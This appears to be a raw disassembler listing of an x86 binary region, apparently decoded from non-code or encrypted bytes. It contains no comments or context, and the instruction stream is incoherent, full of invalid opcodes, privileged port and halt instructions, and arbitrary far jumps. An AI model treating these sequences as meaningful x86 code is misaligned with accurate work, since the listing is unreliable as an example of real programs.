  4111ed:	aam    0xd7
  4111ef:	mov    esi,0xdefdf2e8
  4111f4:	mov    esi,0xfbd4c4e2
  4111f9:	(bad)  
  4111fa:	test   BYTE PTR [ebx],0xbc
  4111fd:	(bad)  
  4111ff:	jmp    0x411204
  411201:	fsub   st,st(3)
  411203:	repnz retf 0xeedc
  411207:	fcmovne st,st(4)
  411209:	jmp    0xc52fecc6
  41120e:	jmp    0xe601:0xbdd2e3dd
  411215:	shl    cl,0x1
  411218:	mov    DWORD PTR [eax],0xcbd9f4f7
  41121e:	stc    
  41121f:	add    al,0xff
  411221:	mov    ecx,0xc3d2d7c1
  411226:	mov    esp,0xdfb3c7ef
  41122b:	hlt    
  41122c:	leave  
  41122d:	hlt    
  41122e:	mov    ebp,0x7f1b9cc
  411233:	sti    
  411234:	loopne 0x41122a
  411236:	fcom   st(1)
  411238:	aad    0xdf
  41123a:	fisttp DWORD PTR [ecx]
  41123c:	cli    
  41123d:	leave  
  41123e:	or     al,ah
  411240:	cld    
  411241:	shl    DWORD PTR [edx-0x1f2b0d3b],0xc5
  411248:	hlt    
  411249:	retf   
  41124a:	in     al,dx
  41124b:	fnstenv [edi-0x1c090d36]
  411251:	clc    
  411252:	hlt    
  411253:	fincstp 
  411255:	in     eax,0xe7
  411257:	out    0xfc,eax
  411259:	fsubrp st(6),st
  41125b:	fcmove st,st(0)
  41125d:	iret   
  41125e:	hlt    
  41125f:	add    bh,ch
  411261:	fucomp st(6)
  411263:	xlat   BYTE PTR ds:[ebx]
  411264:	scas   eax,DWORD PTR es:[edi]
  411265:	out    0xec,al
  411267:	mov    ch,0xcc
  411269:	into   
  41126a:	(bad)  
  41126b:	mov    ah,0xfa
  41126d:	jmp    0x411260
  41126f:	shl    bl,1
  411271:	loopne 0x41126c
  411273:	(bad)  
  411274:	mov    eax,0xe20a02fa
  411279:	sar    BYTE PTR [esi+0x40fc6bd],0xdb
  411280:	in     eax,dx
  411281:	enter  0xddbc,0xe8
  411285:	lods   al,BYTE PTR ds:[esi]
  411286:	jmp    0x41126a
  411288:	rcl    bl,1
  41128a:	cmc    
  41128b:	(bad)  
  41128c:	mov    bh,0xe4
  41128e:	cli    
  41128f:	ret    
  411290:	loope  0x41125e
  411292:	in     eax,dx
  411293:	mov    esi,0xd3dad5d8
  411298:	mov    esp,0xc0f6e908
  41129d:	out    dx,eax
  41129e:	dec    cl
  4112a0:	loop   0x41125b
  4112a2:	(bad)  
  4112a4:	repnz scas al,BYTE PTR es:[edi]
  4112a6:	div    edi
  4112a8:	mov    bl,0xf4
  4112aa:	out    dx,eax
  4112ab:	mov    eax,0xb8d0d6d0
  4112b0:	iret   
  4112b1:	rcr    ah,1
  4112b3:	sti    
  4112b4:	idiv   DWORD PTR [ebp-0x183f0234]
  4112ba:	clc    
  4112bb:	(bad)  
  4112bc:	(bad)  
  4112be:	in     al,0xd
  4112c0:	int3   
  4112c1:	lods   eax,DWORD PTR ds:[esi]
  4112c2:	test   eax,0xc7f7e8eb
  4112c7:	mov    cl,0xe8
  4112c9:	in     al,dx
  4112ca:	mov    dl,0xb8
  4112cc:	in     al,dx
  4112cd:	(bad)  
  4112ce:	fcom   st(0)
  4112d0:	cld    
  4112d1:	stc    
  4112d2:	mov    esp,0xf9d4d7b5
  4112d7:	sar    edi,cl
  4112d9:	fadd   st,st(0)
  4112db:	add    eax,0xcbe3eeca
  4112e0:	fucom  st(4)
  4112e2:	ret    0xb3e1
  4112e5:	stos   DWORD PTR es:[edi],eax
  4112e6:	out    dx,eax
  4112e7:	jmp    0xfa16e2b1
  4112ec:	sar    ecx,cl
  4112ee:	add    edi,DWORD PTR [esi-0x90d403e]
  4112f4:	sti    
  4112f5:	mov    esp,0xdafc0ae6
  4112fa:	call   edi
  4112fc:	out    0x5,eax
  4112fe:	out    dx,eax
  4112ff:	stc    
  411300:	int3   
  411301:	les    esp,FWORD PTR [esi-0x53324f13]
  411307:	in     eax,0xf2
  411309:	mov    al,0xfa
  41130b:	mov    al,0xf9
  41130d:	retf   
  41130e:	lock mov ebx,0xcec1fcd1
  411314:	(bad)  
  411316:	hlt    
  411317:	add    al,0xb8
  411319:	fmulp  st(3),st
  41131b:	imul   cl
  41131d:	or     dh,ah
  41131f:	adc    esp,eax
  411321:	ror    ecx,0xf0
  411324:	(bad)  
  411325:	shl    BYTE PTR [esi-0x4a2f0835],cl
  41132b:	stc    
  41132c:	hlt    
  41132d:	int    0xf4
  41132f:	(bad)  
  411330:	mov    eax,0xb8faddfa
  411335:	fcomip st,st(1)
  411337:	aam    0xea
  411339:	stc    
  41133a:	add    BYTE PTR [esi],cl
  41133c:	or     al,bl
  41133e:	push   cs
  41133f:	or     ebp,esi
  411341:	lock loop 0x411336
  411344:	retf   
  411345:	scas   al,BYTE PTR es:[edi]
  411346:	into   
  411347:	in     al,dx
  411348:	aam    0xef
  41134a:	fcmovne st,st(2)
  41134c:	dec    dh
  41134e:	repnz std 
  411350:	icebp  
  411351:	out    dx,eax
  411352:	into   
  411353:	pop    es
  411354:	cld    
  411355:	fadd   DWORD PTR [ebx]
  411357:	jmp    0x411364
  411359:	loopne 0x411363
  41135b:	(bad)  
  41135c:	dec    BYTE PTR [esi]
  41135e:	add    edx,ebx
  411360:	fidivr DWORD PTR [edi-0x15312958]
  411366:	in     al,0xe8
  411368:	ror    edx,0xba
  41136b:	stc    
  41136c:	retf   
  41136d:	in     eax,dx
  41136e:	out    dx,eax
  41136f:	fcomip st,st(2)
  411371:	fadd   st,st(1)
  411373:	out    0xd6,eax
  411375:	fld    DWORD PTR [esi]
  411377:	add    ah,ch
  411379:	stc    
  41137a:	cli    
  41137b:	(bad)  
  41137c:	into   
  41137d:	ret    
  41137e:	iret   
  41137f:	repnz iret 
  411381:	mov    ebp,0xb5b2c9f0
  411386:	jmp    0x411355
  411388:	sar    dl,1
  41138a:	sar    bl,1
  41138c:	div    bh
  41138e:	(bad)  
  411390:	add    ah,bl
  411392:	into   
  411393:	out    0x0,eax
  411395:	(bad)  
  411396:	cli    
  411397:	out    0xdf,eax
  411399:	loope  0x41138b
  41139b:	add    bh,BYTE PTR [esp+ecx*1-0x22f22308]
  4113a2:	jmp    0xc2cc:0xaac6dece
  4113a9:	call   0xf42acf7f
  4113ae:	mov    ebp,0xb9c1bdfd
  4113b3:	sti    
  4113b4:	in     eax,dx
  4113b5:	out    0xdf,al
  4113b7:	add    al,0xc7
  4113b9:	ret    0xd8e7
  4113bc:	or     eax,0xec0cf3cd
  4113c1:	icebp  
  4113c2:	(bad)  
  4113c4:	test   ebx,0xcfd4ebca
  4113ca:	in     eax,dx
  4113cb:	mov    dh,0xd9
  4113cd:	repz jecxz 0x4113a2
  4113d0:	ret    0xd5cc
  4113d3:	fild   DWORD PTR [edi]
  4113d5:	lock jmp 0x4113d6
  4113d8:	shr    edx,0xc2
  4113db:	add    al,0xcf
  4113dd:	(bad)  [ebx]
  4113df:	stc    
  4113e0:	out    dx,al
  4113e1:	(bad)  [ecx-0x2342481f]
  4113e7:	retf   0xcebb
  4113ea:	fucomi st,st(2)
  4113ec:	mov    edi,0xceb5eeea
  4113f1:	mov    edi,0xd107c3db
  4113f6:	(bad)  
  4113f8:	ret    
  4113f9:	loope  0x4113f8
  4113fb:	cld    
  4113fc:	jmp    0x411405
  4113fe:	jmp    0xcb3310ff
  411403:	in     al,0xc0
  411405:	(bad)  
  411406:	shr    bh,cl
  411408:	rcl    dh,0xc4
  41140b:	idiv   ecx
  41140d:	lock jmp 0xc6fe:0xd7f4ddee
  411415:	neg    edx
  411417:	xlat   BYTE PTR ds:[ebx]
  411418:	(bad)  
  411419:	out    0x4,al
  41141b:	in     eax,0xe9
  41141d:	int    0xcb
  41141f:	repnz or ch,al
  411422:	in     al,dx
  411423:	int    0xcd
  411425:	mov    ebp,0xfbb3b2c9
  41142a:	retf   
  41142b:	(bad)  
  41142c:	out    0xcc,al
  41142e:	enter  0xd4ca,0xcc
  411432:	sar    cl,1
  411434:	add    eax,esp
  411436:	jecxz  0x411409
  411438:	(bad)  [eax]
  41143a:	add    al,0xee
  41143c:	loope  0x411445
  41143e:	(bad)  
  411440:	call   0xe825f201
  411445:	ror    eax,1
  411447:	shl    ecx,1
  411449:	jmp    0xedb5:0xe8ecf0d8
  411450:	fistp  QWORD PTR [esp+ebx*8-0x26072212]
  411457:	add    DWORD PTR [eax],eax
  411459:	xlat   BYTE PTR ds:[ebx]
  41145a:	out    dx,eax
  41145b:	add    eax,DWORD PTR [edx]
  41145d:	cmc    
  41145e:	jmp    0xef1f0741
  411463:	mov    bh,0xaf
  411465:	jmp    0xbbd3:0xc6c0c0cb
  41146c:	out    dx,al
  41146d:	mov    dh,0xbb
  41146f:	mov    ch,0xea
  411471:	add    eax,eax
  411473:	rol    DWORD PTR [ecx],0xe0
  411476:	mov    esi,0xcbf9dacb
  41147b:	pop    es
  41147c:	mov    esp,0x9c5c5f8
  411481:	repnz in al,0xe5
  411484:	leave  
  411485:	(bad)  
  411486:	out    dx,al
  411487:	shl    DWORD PTR [eax-0x1a311f1a],cl
  41148d:	jmp    0xca34f782
  411492:	fcomi  st,st(2)
  411494:	ret    0xd802
  411497:	add    eax,0xe7cae1e5
  41149c:	(bad)  
  41149d:	fild   WORD PTR ds:0xc0c2e1e5
  4114a3:	in     eax,0xd3
  4114a5:	shr    esp,1
  4114a7:	shr    ebp,0xd2
  4114aa:	hlt    
  4114ab:	out    0xd6,eax
  4114ad:	cli    
  4114ae:	mov    ah,0xce
  4114b0:	repz in eax,dx
  4114b2:	fdivr  st,st(0)
  4114b4:	hlt    
  4114b5:	add    eax,eax
  4114b7:	(bad)  
  4114b8:	repnz stc 
  4114ba:	or     edx,edi
  4114bc:	or     dh,cl
  4114be:	hlt    
  4114bf:	in     al,0x11
  4114c1:	call   0xcb28e6a9
  4114c6:	mov    dh,0xe7
  4114c8:	lods   al,BYTE PTR ds:[esi]
  4114c9:	mov    dl,0xb8
  4114cb:	mov    eax,0x2b2f9b8
  4114d0:	mov    esi,0xdbd7f5e8
  4114d5:	rol    DWORD PTR [ebx],0xdb
  4114d8:	sti    
  4114d9:	icebp  
  4114da:	fnstsw WORD PTR [ebp-0x25fcfc28]
  4114e0:	(bad)  
  4114e1:	icebp  
  4114e2:	loope  0x4114af
  4114e4:	shr    eax,cl
  4114e6:	xlat   BYTE PTR ds:[ebx]
  4114e7:	lods   al,BYTE PTR ds:[esi]
  4114e8:	out    0xfb,al
  4114ea:	rcl    bl,cl
  4114ec:	(bad)  
  4114ed:	jmp    0xdbff:0xcce8f4de
  4114f4:	shl    ch,1
  4114f6:	in     al,0xcb
  4114f8:	inc    bh
  4114fa:	fadd   DWORD PTR [eax]
  4114fc:	dec    BYTE PTR ds:0xc3ed04dc
  411502:	shl    ebp,0xc9
  411505:	stos   DWORD PTR es:[edi],eax
  411506:	rol    cl,0xc5
  411509:	mov    ah,0xd9
  41150b:	div    DWORD PTR [edi-0x28320749]
  411511:	mov    esp,0xc6edf6fa
  411516:	(bad)  
  411518:	mov    esp,0x5d402d9
  41151d:	fsub   st(7),st
  41151f:	loope  0x411521
  411521:	ror    esp,0xaf
  411524:	jmp    0xf6c8:0xe7e2cdeb
  41152b:	imul   ah
  41152d:	ror    bl,cl
  41152f:	fdivr  QWORD PTR [ebp-0x21252a38]
  411535:	fstp   TBYTE PTR [edx+esi*8+0x9c403f6]
  41153c:	jmp    0xdeb3:0xdcdedac4
  411543:	retf   
  411544:	scas   al,BYTE PTR es:[edi]
  411545:	not    ah
  411547:	fcmove st,st(4)
  411549:	cmc    
  41154a:	stc    
  41154b:	jmp    0xb92fcc36
  411550:	fmulp  st(7),st
  411552:	mov    ebp,0xe5cdbdcf
  411557:	or     eax,ecx
  411559:	idiv   edi
  41155b:	(bad)  
  41155c:	hlt    
  41155d:	jmp    0xc4ce:0xd3c0d906
  411564:	lds    esi,FWORD PTR [ebp-0x614121b]
  41156a:	out    dx,al
  41156b:	sti    
  41156c:	hlt    
  41156d:	jmp    0xd3d8:0xd4fad0fd
  411574:	cld    
  411575:	ret    0xe505
  411578:	fld    DWORD PTR [edi]
  41157a:	aad    0x8
  41157c:	push   cs
  41157d:	or     bh,ah
  41157f:	or     eax,0xc2c0e10d
  411584:	div    ebp
  411586:	div    ah
  411588:	call   0xff33ee5d
  41158d:	(bad)
  411590:	hlt    
  411591:	ret    
  411592:	add    edx,eax
  411594:	push   es
  411595:	in     al,0xf7
  411597:	repz lock rcr esp,0xfb
  41159c:	(bad)  
  41159d:	fdivr  st,st(4)
  41159f:	loopne 0x4115a1
  4115a1:	retf   0xc9c2
  4115a4:	shl    bl,0xcf
  4115a7:	shl    BYTE PTR [esi-0x3210294c],0xca
  4115ae:	int3   
  4115af:	fstp   st(7)
  4115b1:	mov    bh,0xd1
  4115b3:	iret   
  4115b4:	fcomi  st,st(0)
  4115b6:	out    0xdc,al
  4115b8:	or     eax,DWORD PTR [edx]
  4115ba:	(bad)  
  4115bc:	in     eax,0xdd
  4115be:	(bad)  
  4115bf:	cli    
  4115c0:	int3   
  4115c1:	mov    esi,0xe5edb2c6
  4115c6:	cmc    
  4115c7:	(bad)  
  4115c8:	xlat   BYTE PTR ds:[ebx]
  4115c9:	ror    dh,cl
  4115cb:	repnz repnz mov eax,0xcdc3befd
  4115d2:	loope  0x4115a6
  4115d4:	mov    ah,0xf3
  4115d6:	or     eax,esp
  4115d8:	in     eax,0x8
  4115da:	(bad)  
  4115dc:	loop   0x4115c6
  4115de:	in     eax,dx
  4115df:	int3   
  4115e0:	int    0xe0
  4115e2:	xlat   BYTE PTR ds:[ebx]
  4115e3:	mov    ebp,0xb4adb7e8
  4115e8:	repz (bad) 
  4115ea:	in     al,dx
  4115eb:	shl    edx,1
  4115ed:	repz icebp 
  4115ef:	aad    0xd0
  4115f1:	out    dx,eax
  4115f2:	(bad)  
  4115f3:	fmulp  st(6),st
  4115f5:	rol    BYTE PTR [esi],0xd1
  4115f8:	cmc    
  4115f9:	hlt    
  4115fa:	test   ecx,0xeceae4dc
  411600:	jmp    0xf308c0d4
  411605:	in     al,dx
  411606:	(bad)  
  411607:	jmp    0xb934e7d9
  41160c:	push   DWORD PTR [esi-0xb08162e]
  411612:	rcr    ecx,0xc7
  411615:	shl    ah,0xb
  411618:	add    eax,DWORD PTR [edx]
  41161a:	pop    es
  41161b:	add    edi,DWORD PTR [edi+eax*1-0x3b2d1f18]
  411622:	retf   
  411623:	in     al,dx
  411624:	out    0xb7,al
  411626:	leave  
  411627:	sti    
  411628:	test   al,0xe7
  41162a:	clc    
  41162b:	mov    edi,0xbab9dbac
  411630:	mov    edi,0xe3cff1cc
  411635:	aad    0x2
  411637:	(bad)  
  411638:	xlat   BYTE PTR ds:[ebx]
  411639:	clc    
  41163a:	fadd   st(1),st
  41163c:	aad    0xe
  41163e:	int    0xcb
  411640:	retf   0xc6ac
  411643:	into   
  411644:	mov    dh,0xe1
  411646:	mov    al,0xb1
  411648:	retf   
  411649:	mov    bh,0xd4
  41164b:	retf   0xf7e6
  41164e:	leave  
  41164f:	icebp  
  411650:	mov    ebp,0xd1f3fa01
  411655:	test   cl,0xd6
  411658:	add    esi,ebx
  41165a:	add    eax,0xcbbce9
  41165f:	add    al,0xf3
  411661:	jmp    0xc3f4:0xbcc5beb0
  411668:	mov    cl,0xe6
  41166a:	repz int3 
  41166c:	fdivrp st(3),st
  41166e:	icebp  
  41166f:	mov    ah,0xe9
  411671:	repz mov ebp,0xf703b402
  411677:	ret    0xdaf7
  41167a:	(bad)  
  41167c:	prefetch (bad)
  41167d:	or     eax,0xf2d8d9c4
  411682:	scas   eax,DWORD PTR es:[edi]
  411683:	(bad)  
  411684:	mov    al,0xd7
  411686:	in     al,dx
  411687:	in     al,dx
  411688:	cmc    
  411689:	out    0xd9,al
  41168b:	fidivr DWORD PTR [ecx-0x3012291c]
  411691:	mov    eax,0xe1c000bc
  411696:	ret    0xd9f6
  411699:	retf   
  41169a:	fcmovnb st,st(5)
  41169c:	cld    
  41169d:	add    al,0xdf
  41169f:	loop   0x411694
  4116a1:	jmp    0x411673
  4116a3:	iret   
  4116a4:	out    0xc0,eax
  4116a6:	mov    al,0xb4
  4116a8:	out    0xe5,al
  4116aa:	mov    edx,0xdefdcfb9
  4116af:	fcmovbe st,st(0)
  4116b1:	aam    0xfc
  4116b3:	push   es
  4116b4:	icebp  
  4116b5:	in     eax,dx
  4116b6:	clc    
  4116b7:	(bad)  
  4116b8:	loop   0x4116bd
  4116ba:	or     bh,ah
  4116bc:	fild   WORD PTR ds:0xb1cfffff
  4116c2:	ror    edx,cl
  4116c4:	ror    bl,0xbc
  4116c7:	test   ecx,0xdab7bbcc
  4116cd:	rcr    ah,cl
  4116cf:	idiv   DWORD PTR [ecx-0x2f132141]
  4116d5:	in     al,dx
  4116d6:	(bad)  
  4116d7:	bnd jmp 0x4116b9
  4116da:	add    eax,0xc80bf4fa
  4116df:	pop    es
  4116e0:	in     al,0xc2
  4116e2:	mov    cl,0xc0
  4116e4:	mov    esp,0xf9b6eaf1
  4116e9:	mov    dl,0xd0
  4116eb:	lock in al,0xd7
  4116ee:	cmc    
  4116ef:	mov    ch,0xce
  4116f1:	rcl    edi,1
  4116f3:	fucomi st,st(5)
  4116f5:	fidivr DWORD PTR [esi-0xb2e1a15]
  4116fb:	loopne 0x4116fd
  4116fd:	add    al,0xc
  4116ff:	(bad)  
  411700:	fdiv   st,st(1)
  411702:	xlat   BYTE PTR ds:[ebx]
  411703:	fcomip st,st(5)
  411705:	(bad)  
  411706:	enter  0xcde1,0xeb
  41170a:	fldlg2 
  41170c:	leave  
  41170d:	mul    ah
  41170f:	(bad)  
  411710:	cli    
  411711:	rcr    edx,cl
  411713:	cli    
  411714:	into   
  411715:	(bad)  
  411716:	sar    DWORD PTR [ecx+0x8c0eae4],cl
  41171c:	hlt    
  41171d:	or     ecx,eax
  41171f:	(bad)  
  411720:	retf   0xe2e3
  411723:	(bad)  
  411724:	test   al,0xed
  411726:	retf   
  411727:	in     al,dx
  411728:	ror    dh,0xe5
  41172b:	(bad)  
  41172c:	fnstenv [edi-0xf323607]
  411732:	out    dx,al
  411733:	fdivr  st,st(2)
  411735:	hlt    
  411736:	(bad)  
  411737:	or     dl,cl
  411739:	(bad)  
  41173a:	retf   
  41173b:	enter  0xec9,0xf
  41173f:	(bad)  
  411741:	loopne 0x411709
  411743:	mov    cl,0xe1
  411745:	in     al,dx
  411746:	loopne 0x41170b
  411748:	retf   
  411749:	aad    0xf9
  41174b:	(bad)  
  41174c:	rcl    eax,1
  41174e:	aad    0xd1
  411750:	int3   
  411751:	fcmovne st,st(7)
  411753:	mov    ebp,0xfccce2ed
  411758:	retf   
  411759:	cmc    
  41175a:	std    
  41175b:	aad    0xdf
  41175d:	retf   
  41175e:	(bad)
  411761:	out    dx,eax
  411762:	jmp    0xb106fe26
  411767:	ret    0xb9f7
  41176a:	in     eax,dx
  41176b:	icebp  
  41176c:	call   eax
  41176e:	mov    esi,0xccbdf0f6
  411773:	mov    esp,0xe3f1e001
  411778:	loop   0x41174f
  41177a:	add    al,al
  41177c:	sar    dh,0xf8
  41177f:	jecxz  0x41177f
  411781:	in     al,0xd7
  411783:	mov    ah,0xc9
  411786:	mov    cl,0xb4
  411788:	(bad)  
  411789:	ror    bl,cl
  41178b:	fnop   
  41178d:	fld    st(4)
  41178f:	fxch   st(0)
  411791:	iret   
  411792:	ret    
  411793:	out    dx,eax
  411794:	icebp  
  411795:	int    0x1
  411797:	std    
  411798:	retf   0x4e7
  41179b:	test   esi,0xefcd08d4
  4117a1:	scas   eax,DWORD PTR es:[edi]
  4117a2:	ret    0xd2c0
  4117a5:	rcl    edx,0xd2
  4117a8:	jmp    0xfbf60091
  4117ad:	les    esi,FWORD PTR [eax+edi*4-0xc242917]
  4117b4:	(bad)  
  4117b5:	fistp  QWORD PTR [ecx+edi*8-0x1a1d091a]
  4117bc:	or     ecx,ebx
  4117be:	repz les ecx,FWORD PTR [ecx]
  4117c1:	int    0xdc
  4117c3:	retf   
  4117c4:	icebp  
  4117c5:	(bad)  
  4117c6:	retf   
  4117c7:	mov    dh,0xe1
  4117c9:	repz (bad) 
  4117cb:	lods   eax,DWORD PTR ds:[esi]
  4117cc:	in     al,0xfb
  4117ce:	push   esp
  4117d0:	xlat   BYTE PTR ds:[ebx]
  4117d1:	aam    0xc8
  4117d3:	(bad)  
  4117d4:	repz fcmovb st,st(3)
  4117d7:	cld    
  4117d8:	mov    ah,0xc8
  4117db:	cmc    
  4117dc:	leave  
  4117dd:	loop   0x4117d9
  4117df:	jmp    esi
  4117e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117e2:	mov    edi,0xcae2b2e7
  4117e7:	mov    ch,0xcd
  4117e9:	enter  0xf5d1,0xca
  4117ed:	aam    0xdb
  4117ef:	mov    edi,0xccf9ce02
  4117f4:	add    esp,esp
  4117f6:	fdivr  st,st(1)
  4117f8:	dec    ebx
  4117fa:	fxch   st(7)
  4117fc:	or     cl,bh
  4117fe:	push   cs
  4117ff:	clc    
  411800:	jmp    0xe812f5be
  411805:	in     al,dx
  411806:	(bad)  
  411807:	ror    edx,1
  411809:	jmp    0x4117d1
  41180b:	mov    al,0xf8
  41180d:	fmul   st(6),st
  41180f:	cld    
  411810:	(bad)  
  411811:	repnz mov esp,0xf6d8c2f2
  411817:	add    al,0xe7
  411819:	(bad)  
  41181a:	jecxz  0x411822
  41181c:	dec    DWORD PTR ds:0xea0107cc
  411822:	mov    dl,0xf7
  411824:	mov    bl,0xc3
  411826:	mov    esp,0xf7f2acb5
  41182b:	jmp    0xb5ffe1fd
  411830:	jecxz  0x41180d
  411832:	sti    
  411833:	add    ch,ah
  411835:	clc    
  411836:	sar    dl,cl
  411838:	test   edi,0xf50d0f09
  41183e:	or     ebp,esp
  411840:	repnz stos BYTE PTR es:[edi],al
  411842:	loope  0x411803
  411844:	out    0xe0,eax
  411846:	mov    dh,0xcf
  411848:	out    0xd5,eax
  41184a:	iret   
  41184b:	int3   
  41184c:	cli    
  41184d:	in     eax,0xc9
  41184f:	cld    
  411850:	mov    ebp,0xc3f5cdbc
  411855:	add    al,0xfb
  411857:	lock mov eax,0x8c0fbea
  41185d:	loope  0x411838
  41185f:	push   es
  411860:	push   es
  411861:	jmp    0xf6fe0c42
  411866:	hlt    
  411867:	(bad)  
  411869:	scas   eax,DWORD PTR es:[edi]
  41186a:	loopne 0x411823
  41186c:	jmp    0xe43ee125
  411871:	mov    esp,0xc5e6f7da
  411876:	clc    
  411877:	add    al,0xf2
  411879:	or     bh,ch
  41187b:	loope  0x411846
  41187d:	out    dx,al
  41187e:	or     edi,ebp
  411880:	repz mov edi,0xf7ebc5c5
  411886:	xlat   BYTE PTR ds:[ebx]
  411887:	retf   
  411888:	out    dx,eax
  411889:	mov    dh,0xb2
  41188b:	fidivr WORD PTR [ebx-0x35322f0b]
  411891:	(bad)  
  411892:	add    DWORD PTR [eax-0x2620331f],edi
  411898:	jmp    0xef0b:0x5eaf803
  41189f:	fsubr  st,st(6)
  4118a1:	retf   0xe4b0
  4118a4:	mov    bh,0xc2
  4118a6:	(bad)
  4118a9:	jmp    0xb60bf1a1
  4118ae:	out    dx,al
  4118af:	clc    
  4118b0:	enter  0xbaf9,0xd7
  4118b4:	int3   
  4118b5:	(bad)  
  4118b6:	aad    0x7
  4118b8:	fcomp  st(6)
  4118ba:	or     esp,edx
  4118bc:	in     eax,dx
  4118bd:	(bad)  
  4118bf:	(bad)  
  4118c1:	test   al,0xc7
  4118c3:	shl    eax,cl
  4118c5:	lock ret 0xb3e3
  4118c9:	stc    
  4118ca:	(bad)
  4118cd:	fmul   st,st(1)
  4118cf:	shl    dh,1
  4118d1:	mov    ecx,0xc6e1dbd2
  4118d6:	xlat   BYTE PTR ds:[ebx]
  4118d7:	(bad)  
  4118d8:	sti    
  4118d9:	lock (bad) [eax]
  4118dc:	add    BYTE PTR [ecx],cl
  4118de:	dec    BYTE PTR [edi]
  4118e0:	cld    
  4118e1:	mov    esi,0xbde8e8bf
  4118e6:	loopne 0x4118dd
  4118e8:	shr    bh,0xed
  4118eb:	out    0xda,eax
  4118ed:	mov    ebx,0xcedbbdff
  4118f2:	ret    0xdefd
  4118f5:	add    edx,ebx
  4118f7:	(bad)  
  4118f8:	jecxz  0x4118ff
  4118fa:	(bad)  
  4118fb:	pmullw mm0,QWORD PTR [ebx+ecx*1]
  4118ff:	(bad)  
  411901:	lods   al,BYTE PTR ds:[esi]
  411902:	rcl    ebx,1
  411904:	ret    
  411905:	stos   DWORD PTR es:[edi],eax
  411906:	leave  
  411907:	ret    
  411908:	jmp    0xd5ca:0xedcffbb9
  41190f:	hlt    
  411910:	mov    al,0xba
  411912:	aad    0xcd
  411914:	sar    esi,0xe4
  411917:	mov    ebp,0xb070505
  41191c:	vpavgw xmm2,xmm4,XMMWORD PTR [edx]
  411920:	(bad)  
  411921:	loopne 0x4118fa
  411923:	in     eax,dx
  411924:	mov    al,0xb0
  411926:	in     al,0xce
  411928:	call   0xb93a0407
  41192d:	sar    BYTE PTR [edi-0x1c172e43],cl
  411933:	fcomip st,st(5)
  411935:	lock out 0xfa,eax
  411938:	add    eax,0xee1d4d1
  41193d:	out    dx,al
  41193e:	loope  0x41191d
  411940:	or     ecx,eax
  411942:	int    0xca
  411944:	mov    bl,0xae
  411946:	shl    esi,1
  411948:	mov    dh,0xce
  41194a:	int    0xc9
  41194c:	retf   
  41194d:	fcmovu st,st(6)
  41194f:	int3   
  411950:	cmc    
  411951:	ret    0xf7d3
  411954:	rol    DWORD PTR [ebx],0xf2
  411957:	add    BYTE PTR [eax-0x16183b01],bh
  41195d:	int    0x6
  41195f:	int    0x13
  411961:	fincstp 
  411963:	loope  0x41192e
  411965:	fst    st(7)
  411967:	out    0xc1,al
  411969:	aam    0xae
  41196b:	mov    edx,0xf2fdf4e5
  411970:	loop   0x41196b
  411972:	xlat   BYTE PTR ds:[ebx]
  411973:	int3   
  411974:	add    eax,0xd2d0e3e4
  411979:	ret    
  41197a:	add    bh,bh
  41197c:	mov    esp,0xe0edc5cb
  411981:	shr    al,cl
  411983:	in     eax,0xc7
  411985:	(bad)  
  411986:	les    esi,FWORD PTR [ebx-0x4936271a]
  41198c:	leave  
  41198d:	out    dx,al
  41198e:	mov    edx,0x7d4e9de
  411993:	ror    ah,cl
  411995:	hlt    
  411996:	shl    ecx,cl
  411998:	add    cl,cl
  41199a:	add    al,0xbd
  41199c:	std    
  41199d:	(bad)
  4119a1:	int3   
  4119a2:	into   
  4119a3:	(bad)
  4119a6:	(bad)  
  4119a7:	fcomi  st,st(6)
  4119a9:	cli    
  4119aa:	lock fstp TBYTE PTR [ecx-0x210e0333]
  4119b1:	stc    
  4119b2:	loopne 0x4119a4
  4119b4:	out    dx,al
  4119b5:	fdiv   st,st(6)
  4119b7:	stc    
  4119b8:	aad    0xc4
  4119ba:	sar    bl,1
  4119bc:	iret   
  4119bd:	ret    
  4119be:	or     DWORD PTR [edx],eax
  4119c0:	enter  0xb8cf,0xae
  4119c4:	retf   
  4119c5:	rcl    eax,0xcc
  4119c8:	loopne 0x4119aa
  4119ca:	mov    bh,0xc7
  4119cc:	cli    
  4119cd:	sar    BYTE PTR [edi-0x2f021d10],1
  4119d3:	ror    esi,cl
  4119d5:	fcomip st,st(0)
  4119d7:	cmc    
  4119d8:	jecxz  0x41199d
  4119da:	loopne 0x4119a4
  4119dc:	or     DWORD PTR [eax],ecx
  4119de:	fsubp  st(2),st
  4119e0:	or     al,0xb2
  4119e2:	call   0xd5f8fca3
  4119e7:	out    dx,al
  4119e8:	rcl    cl,0xec
  4119eb:	mov    dh,0xba
  4119ed:	sar    dl,cl
  4119ef:	test   al,0xee
  4119f2:	sar    ah,0xee
  4119f5:	fadd   DWORD PTR [edx]
  4119f7:	retf   
  4119f8:	fld    DWORD PTR ds:0xcec9e5e0
  4119fe:	loope  0x4119ec
  411a00:	stc    
  411a01:	fdiv   st,st(3)
  411a03:	(bad)  
  411a05:	(bad)  
  411a06:	int    0xd4
  411a08:	lock icebp 
  411a0a:	jmp    0xe203:0xfcbef6ad
  411a11:	in     al,dx
  411a12:	out    dx,al
  411a13:	aad    0xed
  411a15:	out    0xe2,al
  411a17:	add    ah,dl
  411a19:	add    eax,DWORD PTR [ecx]
  411a1b:	in     eax,0xc9
  411a1d:	jmp    0x411a0b
  411a1f:	(bad)  
  411a21:	(bad)
  411a24:	int    0xd7
  411a26:	in     eax,dx
  411a27:	icebp  
  411a28:	rcr    bl,cl
  411a2a:	leave  
  411a2b:	stc    
  411a2c:	fdivp  st(5),st
  411a2e:	fcmovnu st,st(7)
  411a30:	icebp  
  411a31:	jmp    0xf32e0bf2
  411a36:	repnz add esi,edx
  411a39:	fstp   st(6)
  411a3b:	pop    es
  411a3c:	into   
  411a3d:	jecxz  0x411a0b
  411a3f:	or     al,bl
  411a41:	mov    dl,0xcc
  411a43:	ret    
  411a44:	ror    ah,1
  411a46:	(bad)  
  411a47:	(bad)  
  411a48:	neg    cl
  411a4a:	mov    dl,0xf3
  411a4c:	retf   
  411a4d:	std    
  411a4e:	div    edi
  411a50:	iret   
  411a51:	aam    0xd2
  411a53:	mov    esp,0xd2f1f1d0
  411a58:	fmul   QWORD PTR [ebx]
  411a5a:	mov    esi,0x9c8cbd9
  411a5f:	into   
  411a60:	fsub   st(4),st
  411a62:	retf   0xb3b0
  411a65:	jmp    0x411a5e
  411a67:	lods   eax,DWORD PTR ds:[esi]
  411a68:	xlat   BYTE PTR ds:[ebx]
  411a69:	(bad)
  411a6c:	in     eax,dx
  411a6d:	hlt    
  411a6e:	std    
